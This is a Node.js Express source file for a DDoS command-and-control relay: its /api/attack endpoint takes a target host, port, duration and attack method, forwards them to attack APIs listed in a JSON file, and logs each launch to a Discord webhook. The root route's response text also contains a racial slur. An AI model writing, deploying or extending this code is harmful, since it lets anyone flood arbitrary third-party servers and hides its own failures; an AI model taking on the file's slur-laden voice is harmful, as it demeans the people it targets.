//logging via discord webhook in .js

const express = require("express");
const http = require("http");
const axios = require("axios");
const fs = require("fs");
const app = express();
const allapis = fs.readFileSync("apis.json");
const methodFile = fs.readFileSync("apis.json");

const discordWebhookUrl = "https://discord.com/api/webhooks/numbas/abcdefg"; // replace with your actual webhook URL

app.get("/", (req, res) => {
    res.status(401).json({error: true, message: "you see the drip my nigga loc, welcome to the goodrip cnc api funnel webhook logger thingy sucker"});
});

app.get("/api/attack", async (req, res) => {
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;
    const apis = JSON.parse(allapis);
    const methods = JSON.parse(methodFile);
    if (!(host && port && time && method)) return res.send({"error": true, "message": "Missing parameters."});
    if (!apis[method]) return res.send({"error": true, "message": "Invalid method."});
    const sendreqallapis = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", port).replace("<<$time>>", time);
    axios.get(sendreqallapis).then(resp => {
        // log to Discord webhook
        const message = `Port: ${port}, Method: ${method}`;
        axios.post(discordWebhookUrl, { content: message }).catch(err => console.error(err));
        res.send(resp.data);
    });
});

app.listen("1337", () => {
    console.log(`Example app listening on port 1337`)
});

process.on('uncaughtException', err => (""));
process.on('unhandledRejection', err => (""));
